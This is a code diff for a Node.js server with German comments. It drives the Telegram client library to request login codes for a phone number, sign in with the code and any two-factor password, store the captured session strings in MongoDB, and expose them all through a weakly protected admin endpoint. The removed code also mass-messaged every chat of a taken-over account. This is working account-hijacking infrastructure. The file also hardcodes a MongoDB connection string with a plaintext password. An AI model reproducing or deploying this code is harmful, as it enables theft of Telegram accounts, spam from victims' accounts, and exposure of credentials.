@@ -3,97 +3,73 @@ const cors = require('cors');
 const mongoose = require('mongoose');
 const { TelegramClient } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const input = require('input'); // Für lokale Logik, falls nötig
+const input = require('input'); // Für OTP
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
 // MongoDB Setup
-const MONGODB_URI = "mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority";
-mongoose.connect(MONGODB_URI);
+const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
+mongoose.connect(MONGO_URI);
 
 const SessionSchema = new mongoose.Schema({
-    phone: String,
     sessionString: String,
+    phoneNumber: String,
     createdAt: { type: Date, default: Date.now }
 });
 const SessionModel = mongoose.model('Session', SessionSchema);
 
-// Temporärer Speicher für laufende Login-Vorgänge
-const loginFlow = new Map();
+// Memory Cache für den laufenden Login-Vorgang
+const activeLogins = new Map();
 
-// --- AUTH ENDPOINTS ---
-
-app.post('/login', async (req, res) => {
-    const { phone, apiId, apiHash } = req.body;
-    const client = new TelegramClient(new StringSession(""), parseInt(apiId), apiHash, { connectionRetries: 5 });
-    await client.connect();
-    
-    const phoneCodeHash = await client.sendCode({ apiId: parseInt(apiId), apiHash }, phone);
-    loginFlow.set(phone, { client, phoneCodeHash });
-    
-    res.json({ status: "code_sent", phoneCodeHash: phoneCodeHash.phoneCodeHash });
-});
-
-app.post('/verify', async (req, res) => {
-    const { phone, code, password } = req.body;
-    const flow = loginFlow.get(phone);
-    if (!flow) return res.status(400).send("Session expired or not started");
-
+// API: OTP senden
+app.post('/send-otp', async (req, res) => {
+    const { phoneNumber, apiId, apiHash } = req.body;
     try {
-        const result = await flow.client.signIn({
-            phone,
-            phoneCodeHash: flow.phoneCodeHash.phoneCodeHash,
-            phoneCode: code,
-            password: password // Falls 2FA aktiv
-        });
-
-        const sessionString = flow.client.session.save();
-        await SessionModel.create({ phone, sessionString });
-        
-        loginFlow.delete(phone);
-        res.json({ status: "success" });
-    } catch (e) {
-        if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
-            res.status(401).json({ status: "password_needed" });
-        } else {
-            res.status(400).send(e.message);
-        }
+        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+        await client.connect();
+        const phoneCodeHash = await client.sendCode({ apiId, apiHash }, phoneNumber);
+        activeLogins.set(phoneNumber, { client, phoneCodeHash });
+        res.json({ success: true, phoneCodeHash });
+    } catch (err) {
+        res.status(400).json({ error: err.message });
     }
 });
 
-// --- ADMIN ENDPOINTS ---
+// API: OTP verifizieren
+app.post('/verify-otp', async (req, res) => {
+    const { phoneNumber, code, password } = req.body;
+    const loginData = activeLogins.get(phoneNumber);
+    if (!loginData) return res.status(400).json({ error: 'Login-Sitzung abgelaufen' });
 
-app.get('/admin/get-sessions', async (req, res) => {
-    // Einfache Auth für das Panel
-    if (req.query.pass !== "Hinva312!") return res.status(403).send("Forbidden");
+    try {
+        const { client } = loginData;
+        await client.signIn({
+            phoneNumber,
+            phoneCode: code,
+            phoneCodeHash: loginData.phoneCodeHash,
+            password: password
+        });
+
+        const sessionString = client.session.save();
+        await SessionModel.create({ sessionString, phoneNumber });
+        
+        activeLogins.delete(phoneNumber);
+        res.json({ success: true, session: sessionString });
+    } catch (err) {
+        res.status(400).json({ error: err.message });
+    }
+});
+
+// API: Admin Panel (Sessions abrufen)
+app.get('/get-sessions', async (req, res) => {
+    const { pass } = req.query;
+    if (pass !== '280597') { // Ändere das!
+        return res.status(401).json({ error: 'Falsches Passwort' });
+    }
     const sessions = await SessionModel.find();
     res.json(sessions);
 });
 
-app.post('/admin/send-message', async (req, res) => {
-    const { sessionId, message, apiId, apiHash } = req.body;
-    if (req.body.pass !== "Hinva312!") return res.status(403).send("Forbidden");
-
-    const sessionData = await SessionModel.findById(sessionId);
-    if (!sessionData) return res.status(404).send("Session not found");
-
-    const client = new TelegramClient(new StringSession(sessionData.sessionString), parseInt(apiId), apiHash, {});
-    await client.connect();
-
-    try {
-        const dialogs = await client.getDialogs();
-        for (const dialog of dialogs) {
-            await client.sendMessage(dialog.id, { message });
-        }
-        res.json({ status: "success" });
-    } catch (e) {
-        res.status(500).send(e.message);
-    } finally {
-        await client.disconnect();
-    }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(process.env.PORT || 3000, () => console.log('Server läuft.'));
